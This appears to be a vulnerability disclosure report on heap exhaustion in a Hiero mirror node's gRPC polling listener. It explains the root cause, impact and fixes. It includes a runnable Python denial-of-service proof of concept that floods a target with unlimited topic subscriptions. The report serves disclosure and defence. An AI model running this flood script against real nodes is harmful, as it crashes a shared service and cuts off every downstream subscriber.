### Title
Per-Subscription Heap Exhaustion via Unbounded `getResultList()` Materialization in `PollingTopicListener` (POLL Mode)

### Summary
When the gRPC listener is configured with `type=POLL`, each subscription independently calls `topicMessageRepository.findByFilter()`, which fully materializes up to `maxPageSize=5000` `TopicMessage` objects into a `List` on the heap via `getResultList()` every poll interval (default 500ms). There is no global subscription count limit, and the per-connection cap of 5 (`maxConcurrentCallsPerConnection`) is trivially bypassed by opening many connections. An unprivileged attacker can drive the JVM into `OutOfMemoryError` by opening enough concurrent connections with unlimited, old-startTime subscriptions.

### Finding Description

**Exact code path:**

`ConsensusController.subscribeTopic()` → `TopicMessageServiceImpl.subscribeTopic()` → `incomingMessages()` → `topicListener.listen(newFilter)` → `PollingTopicListener.listen()` → `poll()` → `topicMessageRepository.findByFilter(newFilter)`.

**Root cause — full heap materialization:**

`TopicMessageRepositoryCustomImpl.findByFilter()` line 60:
```java
return typedQuery.getResultList().stream();
```
The comment explicitly acknowledges that `getResultStream()` (cursor-based) was abandoned. `getResultList()` fetches the entire result set into a `List<TopicMessage>` in the JPA persistence context before returning. This means every poll cycle allocates a full `List` of up to `maxPageSize` (default 5000) objects on the heap.

**Per-subscription independent polling:**

`PollingTopicListener.listen()` (lines 34–49) creates a new `PollingContext` per call and starts an independent `Flux.defer(() -> poll(context))` loop repeating every 500ms. This is not shared — unlike `SharedPollingTopicListener`, every subscriber gets its own polling loop and its own heap allocation per cycle.

**No limit when `filter.hasLimit()` is false:**

`poll()` lines 54–57:
```java
int limit = filter.hasLimit() ? (int)(filter.getLimit() - context.getCount().get()) : Integer.MAX_VALUE;
int pageSize = Math.min(limit, listenerProperties.getMaxPageSize());
```
With no limit set by the client, `limit = Integer.MAX_VALUE`, so `pageSize = maxPageSize = 5000`. Every poll cycle materializes 5000 objects.

**`startTime=0` is valid:**

`TopicMessageFilter.isValidStartTime()` (line 49–51) only rejects future timestamps (`startTime <= DomainUtils.now()`). Epoch 0 passes. The first poll on a high-volume topic returns a full page of 5000 messages immediately.

**Per-connection cap is not a global cap:**

`NettyProperties.maxConcurrentCallsPerConnection = 5` (line 14) limits calls per TCP connection. An attacker opens `N` connections × 5 subscriptions = `5N` total concurrent subscriptions. No code enforces a global subscription ceiling.

**Exploit flow:**
1. Attacker opens `K` gRPC connections (e.g., K=1000).
2. Each connection issues 5 `subscribeTopic` RPCs: `topicId=<high-volume topic>`, `consensusStartTime=0`, no `limit`, no `endTime`.
3. Server is in `POLL` mode (`hiero.mirror.grpc.listener.type=POLL`).
4. Every 500ms, each of the 5000 subscriptions calls `getResultList()` and allocates a `List<TopicMessage>` of up to 5000 objects.
5. Concurrent allocations: 5000 subscriptions × 5000 objects × ~1–6 KB per `TopicMessage` = tens to hundreds of GB of live heap pressure.
6. JVM GC cannot reclaim fast enough → `OutOfMemoryError` → process crash.

### Impact Explanation

The mirror node gRPC process crashes, severing all active HCS topic subscriptions for all clients. Since the mirror node is the sole source of HCS streaming data for downstream applications, this constitutes a complete denial of the HCS subscription service. Recovery requires a process restart. The attack is repeatable immediately after restart with no state required on the attacker side.

### Likelihood Explanation

The precondition is that the deployment uses `type=POLL` (not the default `REDIS`). However, `POLL` is a documented, supported mode and operators may choose it when Redis is unavailable or undesired. The attacker needs only a gRPC client library (freely available), knowledge of any valid high-volume topic ID (publicly observable on-chain), and the ability to open many TCP connections — all achievable without any credentials or special privileges. The attack is fully repeatable and requires no prior state.

### Recommendation

1. **Enforce a global concurrent subscription limit** in `TopicMessageServiceImpl` using the existing `subscriberCount` gauge — reject new subscriptions above a configurable threshold.
2. **Replace `getResultList().stream()` with a true cursor/scroll** in `TopicMessageRepositoryCustomImpl.findByFilter()`. Use JPA `ScrollableResults` or Spring Data's `ScrollPosition` API with `FETCH_SIZE` hint to avoid full heap materialization.
3. **Add per-IP or per-client connection rate limiting** at the gRPC server or load-balancer layer.
4. **Cap `maxPageSize`** to a lower default (e.g., 100–500) in `POLL` mode, or make it configurable with a hard upper bound enforced by `@Max`.

### Proof of Concept

```python
import grpc
import threading
from com.hedera.mirror.api.proto import consensus_service_pb2, consensus_service_pb2_grpc
from proto import timestamp_pb2, basic_types_pb2

TARGET = "mirror-node-grpc:5600"
TOPIC_SHARD, TOPIC_REALM, TOPIC_NUM = 0, 0, 1234  # high-volume topic
NUM_CONNECTIONS = 200
CALLS_PER_CONNECTION = 5  # matches maxConcurrentCallsPerConnection

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(shardNum=TOPIC_SHARD, realmNum=TOPIC_REALM, topicNum=TOPIC_NUM),
        consensusStartTime=timestamp_pb2.Timestamp(seconds=0, nanos=0),
        # no limit, no endTime
    )
    threads = []
    for _ in range(CALLS_PER_CONNECTION):
        t = threading.Thread(target=lambda: list(stub.subscribeTopic(query)))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

attack_threads = [threading.Thread(target=flood, args=(i,)) for i in range(NUM_CONNECTIONS)]
for t in attack_threads:
    t.start()
# 200 connections × 5 subscriptions = 1000 concurrent polling loops
# Each loop materializes up to 5000 TopicMessage objects every 500ms
# Expected result: OOM / process crash within seconds on a populated topic
```

        PollingContext context = new PollingContext(filter);
        Duration interval = listenerProperties.getInterval();

        return Flux.defer(() -> poll(context))
                .delaySubscription(interval, scheduler)
                .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                        .jitter(0.1)
                        .withFixedDelay(interval)
                        .withScheduler(scheduler))
                .name(METRIC)
                .tag(METRIC_TAG, "poll")
                .tap(Micrometer.observation(observationRegistry))
                .doOnNext(context::onNext)
                .doOnSubscribe(s -> log.info("Starting to poll every {}ms: {}", interval.toMillis(), filter));
    }
